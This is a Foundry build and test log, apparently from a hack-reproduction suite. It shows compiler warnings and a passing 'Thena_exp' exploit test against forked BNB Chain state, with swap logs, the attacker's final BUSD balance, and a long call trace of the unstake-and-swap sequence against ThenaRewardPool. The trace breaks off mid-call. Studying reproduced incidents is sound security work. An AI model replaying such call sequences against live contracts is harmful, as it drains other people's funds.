Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.18s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-03/Thena_exp.sol:53:5:
   |
53 |     IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 279.48ms (161.96µs CPU time)

Ran 1 test for src/test/2023-03/Thena_exp.sol:ContractTest
[PASS] testExploit() (gas: 1333046)
Logs:
  thena swap in: 254628653759513991403 out 0
  thena swap in: 20139972262 out 0
  thena swap in: 21036826084489258165 out 0
  wUsdr: 4835787773611  usdc: 5061189125337114043869
  thena swap in: 4835787773611 out 0
  sell usdc to usdt 10096969660375960293491 10089706261008774455811
  thena swap in: 10096969660375960293491 out 10068139232819537542117
  nav: 10089706261008774455811 minNavExpected: 10089909806291176549697
  Attacker BUSD balance after exploit: 10197.896014936863810188

Traces:
  [1628546] ContractTest::testExploit()
    ├─ [1565634] → new MockThenaRewardPool@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [1495950] ThenaRewardPool::unstake(BUSD: [0x55d398326f99059fF775485246999027B3197955], 0, MockThenaRewardPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], true)
    │   │   ├─ [1491037] 0xaEDb00947B0BFd2723898F78018b4BB7b2398CdC::unstake(BUSD: [0x55d398326f99059fF775485246999027B3197955], 0, MockThenaRewardPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], true) [delegatecall]
    │   │   │   ├─ [174351] ThenaRewardPool::netAssetValue() [staticcall]
    │   │   │   │   ├─ [173956] 0xaEDb00947B0BFd2723898F78018b4BB7b2398CdC::netAssetValue() [delegatecall]
    │   │   │   │   │   ├─ [2531] BUSD::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [9796] USDC::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   │   │   ├─ [2553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [2645] wUSDR::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 20139972262 [2.013e10]
    │   │   │   │   │   ├─ [2632] 0x2e537237143ABf74A176d0067bEEbeEbe845300a::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 156444250371137897 [1.564e17]
    │   │   │   │   │   ├─ [300] wUSDR_USDC::isStable() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] false
    │   │   │   │   │   ├─ [25374] UniV2Router::quoteRemoveLiquidity(USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087], false, 156444250371137897 [1.564e17]) [staticcall]
    │   │   │   │   │   │   ├─ [10302] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getPair(USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087], false) [staticcall]
    │   │   │   │   │   │   │   ├─ [2974] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getPair(USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087], false) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000a99c4051069b774102d6d215c6a9ba69bd616e6a
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000a99c4051069b774102d6d215c6a9ba69bd616e6a
    │   │   │   │   │   │   ├─ [6620] wUSDR_USDC::getReserves() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 1594696944090481 [1.594e15], 1669069584412808739831639 [1.669e24], 1679935677 [1.679e9]
    │   │   │   │   │   │   ├─ [2385] wUSDR_USDC::totalSupply() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 51591245139026378510 [5.159e19]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000001125efe785462c46a7d00000000000000000000000000000000000000000000000000000465e7c7911d
    │   │   │   │   │   ├─ [15643] 0x51597f405303C4377E36123cBc172b13269EA163::latestRoundData() [staticcall]
    │   │   │   │   │   │   ├─ [7410] 0x7008fDEd94a8Ce68D01FEB633C4D81C2be7a1B20::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 27742 [2.774e4], 99976240 [9.997e7], 1679938025 [1.679e9], 1679938025 [1.679e9], 27742 [2.774e4]
    │   │   │   │   │   │   └─ ← [Return] 36893488147419130974 [3.689e19], 99976240 [9.997e7], 1679938025 [1.679e9], 1679938025 [1.679e9], 36893488147419130974 [3.689e19]
    │   │   │   │   │   ├─ [15643] 0xB97Ad0E74fa7d920791E90258A6E2085088b4320::latestRoundData() [staticcall]
    │   │   │   │   │   │   ├─ [7410] 0x2dc202b56A03667cC240B290c2BE2b8453E89eA1::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 26972 [2.697e4], 100062000 [1e8], 1679938346 [1.679e9], 1679938346 [1.679e9], 26972 [2.697e4]
    │   │   │   │   │   │   └─ ← [Return] 36893488147419130204 [3.689e19], 100062000 [1e8], 1679938346 [1.679e9], 1679938346 [1.679e9], 36893488147419130204 [3.689e19]
    │   │   │   │   │   ├─ [300] wUSDR_USDC::isStable() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] false
    │   │   │   │   │   ├─ [12650] UniV2Router::getAmountsOut(4855866795971 [4.855e12], [(0x2952beb1326acCbB5243725bd4Da2fC937BCa087, 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d, false)]) [staticcall]
    │   │   │   │   │   │   ├─ [3461] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPair(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   │   ├─ [2642] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPair(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   ├─ [5127] wUSDR_USDC::getAmountOut(4855866795971 [4.855e12], wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087]) [staticcall]
    │   │   │   │   │   │   │   ├─ [3378] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(false) [staticcall]
    │   │   │   │   │   │   │   │   ├─ [2559] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(false) [delegatecall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   │   │   └─ ← [Return] 5056800295190813276314 [5.056e21]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000046a983727c3000000000000000000000000000000000000000000000112213394665ae0f89a
    │   │   │   │   │   ├─ [30785] UniV2Router::getAmountsOut(5056800295190813276314 [5.056e21], [(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d, 0x55d398326f99059fF775485246999027B3197955, true)]) [staticcall]
    │   │   │   │   │   │   ├─ [3461] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPair(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   │   │   ├─ [2642] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPair(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   ├─ [20752] USDC_BUSD::getAmountOut(5056800295190813276314 [5.056e21], USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d]) [staticcall]
    │   │   │   │   │   │   │   ├─ [3368] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(true) [staticcall]
    │   │   │   │   │   │   │   │   ├─ [2549] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(true) [delegatecall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   │   └─ ← [Return] 5053214990480288588170 [5.053e21]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000112213394665ae0f89a000000000000000000000000000000000000000000000111ef7204c2e885218a
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000224123d61a5d869096f
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000224123d61a5d869096f
    │   │   │   ├─ [632] 0x2e537237143ABf74A176d0067bEEbeEbe845300a::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   └─ ← [Return] 156444250371137897 [1.564e17]
    │   │   │   ├─ [92293] 0x2e537237143ABf74A176d0067bEEbeEbe845300a::getReward()
    │   │   │   │   ├─ [29747] THENA::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 254628653759513991403 [2.546e20])
    │   │   │   │   │   ├─ emit Transfer(from: 0x2e537237143ABf74A176d0067bEEbeEbe845300a, to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], value: 254628653759513991403 [2.546e20])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ emit Harvest(param0: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], param1: 254628653759513991403 [2.546e20])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [542] THENA::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   └─ ← [Return] 254628653759513991403 [2.546e20]
    │   │   │   ├─ [17170] UniV2Router::getAmountsOut(254628653759513991403 [2.546e20], [(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11, 0x55d398326f99059fF775485246999027B3197955, false)]) [staticcall]
    │   │   │   │   ├─ [3461] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPair(0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06) [staticcall]
    │   │   │   │   │   ├─ [2642] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPair(0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [7137] 0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06::getAmountOut(254628653759513991403 [2.546e20], THENA: [0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11]) [staticcall]
    │   │   │   │   │   ├─ [1378] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(false) [staticcall]
    │   │   │   │   │   │   ├─ [559] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(false) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   └─ ← [Return] 87157630361246976856 [8.715e19]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000dcdaeb3838bc398eb000000000000000000000000000000000000000000000004b98e1b085aed4b58
    │   │   │   ├─ [24567] THENA::approve(UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], 254628653759513991403 [2.546e20])
    │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 254628653759513991403 [2.546e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [0] console::log("thena swap in: %s out %s", 254628653759513991403 [2.546e20], 0) [staticcall]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [153403] UniV2Router::swapExactTokensForTokens(254628653759513991403 [2.546e20], 0, [(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11, 0x55d398326f99059fF775485246999027B3197955, false)], ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 1679938553 [1.679e9])
    │   │   │   │   ├─ [1461] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPair(0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06) [staticcall]
    │   │   │   │   │   ├─ [642] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPair(0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [3137] 0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06::getAmountOut(254628653759513991403 [2.546e20], THENA: [0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11]) [staticcall]
    │   │   │   │   │   ├─ [1378] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(false) [staticcall]
    │   │   │   │   │   │   ├─ [559] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(false) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   └─ ← [Return] 87157630361246976856 [8.715e19]
    │   │   │   │   ├─ [8646] THENA::transferFrom(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06, 254628653759513991403 [2.546e20])
    │   │   │   │   │   ├─ emit Transfer(from: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], to: 0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06, value: 254628653759513991403 [2.546e20])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [126969] 0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06::swap(87157630361246976856 [8.715e19], 0, ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 0x)
    │   │   │   │   │   ├─ [3193] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPaused() [staticcall]
    │   │   │   │   │   │   ├─ [2377] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPaused() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─ [27971] BUSD::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 87157630361246976856 [8.715e19])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06, to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], value: 87157630361246976856 [8.715e19])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] BUSD::balanceOf(0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 93381499444083993633163 [9.338e22]
    │   │   │   │   │   ├─ [542] THENA::balanceOf(0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 272520524137123345892014 [2.725e23]
    │   │   │   │   │   ├─ [1378] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(false) [staticcall]
    │   │   │   │   │   │   ├─ [559] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(false) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   ├─ [3231] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::dibs() [staticcall]
    │   │   │   │   │   │   ├─ [2415] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::dibs() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000664ce330511653cb2744b8ed50dba31c6c4c08ca
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000664ce330511653cb2744b8ed50dba31c6c4c08ca
    │   │   │   │   │   ├─ [3202] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::MAX_REFERRAL_FEE() [staticcall]
    │   │   │   │   │   │   ├─ [2386] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::MAX_REFERRAL_FEE() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   │   │   │   ├─ [7847] THENA::transfer(0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, 61110876902283357 [6.111e16])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06, to: 0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, value: 61110876902283357 [6.111e16])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [3223] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::stakingNFTFee() [staticcall]
    │   │   │   │   │   │   ├─ [2407] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::stakingNFTFee() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000898
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000898
    │   │   │   │   │   ├─ [5603] 0x80A35AdDCEc619EA477F9ff7d480E2c7a76523d9::processStakingFees(98592214735683817 [9.859e16], false)
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ [7847] THENA::transfer(0x80A35AdDCEc619EA477F9ff7d480E2c7a76523d9, 448146430616744625 [4.481e17])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06, to: 0x80A35AdDCEc619EA477F9ff7d480E2c7a76523d9, value: 448146430616744625 [4.481e17])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ emit Fees(param0: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], param1: 0, param2: 509257307519027982 [5.092e17])
    │   │   │   │   │   ├─ [531] BUSD::balanceOf(0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 93381499444083993633163 [9.338e22]
    │   │   │   │   │   ├─ [542] THENA::balanceOf(0xA051eF9A6FBea340Bb734d022e7B6a3aD9fD9B06) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 272520014879815826864032 [2.725e23]
    │   │   │   │   │   ├─ emit Sync(: 93381499444083993633163 [9.338e22], : 272520014879815826864032 [2.725e23])
    │   │   │   │   │   ├─ emit Swap(sender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], amount0In: 0, amount1In: 254628653759513991403 [2.546e20], amount0Out: 87157630361246976856 [8.715e19], amount1Out: 0, to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─  emit topic 0: 0xff3715fa8f2d4d791dd7a610a545050b8c6fe3a62b0f6c38f2f96a00598fe483
    │   │   │   │   │        topic 1: 0x00000000000000000000000039e29f4fb13aec505ef32ee6ff7cc16e2225b11f
    │   │   │   │   │        topic 2: 0x00000000000000000000000039e29f4fb13aec505ef32ee6ff7cc16e2225b11f
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000dcdaeb3838bc398eb000000000000000000000000f4c8e32eadec4bfe97e0f595add0f4450a863a11
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000dcdaeb3838bc398eb000000000000000000000000000000000000000000000004b98e1b085aed4b58
    │   │   │   ├─ [645] wUSDR::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   └─ ← [Return] 20139972262 [2.013e10]
    │   │   │   ├─ [645] wUSDR::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   └─ ← [Return] 20139972262 [2.013e10]
    │   │   │   ├─ [4712] wUSDR::approve(UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], 20139972262 [2.013e10])
    │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 20139972262 [2.013e10])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [0] console::log("thena swap in: %s out %s", 20139972262 [2.013e10], 0) [staticcall]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [221629] UniV2Router::swapExactTokensForTokens(20139972262 [2.013e10], 0, [(0x2952beb1326acCbB5243725bd4Da2fC937BCa087, 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d, false)], ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 1679938553 [1.679e9])
    │   │   │   │   ├─ [1461] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPair(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   ├─ [642] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPair(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [3127] wUSDR_USDC::getAmountOut(20139972262 [2.013e10], wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087]) [staticcall]
    │   │   │   │   │   ├─ [1378] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(false) [staticcall]
    │   │   │   │   │   │   ├─ [559] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(false) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   └─ ← [Return] 21036826084489258165 [2.103e19]
    │   │   │   │   ├─ [16344] wUSDR::transferFrom(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], 20139972262 [2.013e10])
    │   │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 0)
    │   │   │   │   │   ├─ emit Transfer(from: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], to: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], value: 20139972262 [2.013e10])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [187557] wUSDR_USDC::swap(0, 21036826084489258165 [2.103e19], ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 0x)
    │   │   │   │   │   ├─ [1193] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPaused() [staticcall]
    │   │   │   │   │   │   ├─ [377] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPaused() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─ [28739] USDC::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 21036826084489258165 [2.103e19])
    │   │   │   │   │   │   ├─ [27993] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 21036826084489258165 [2.103e19]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], value: 21036826084489258165 [2.103e19])
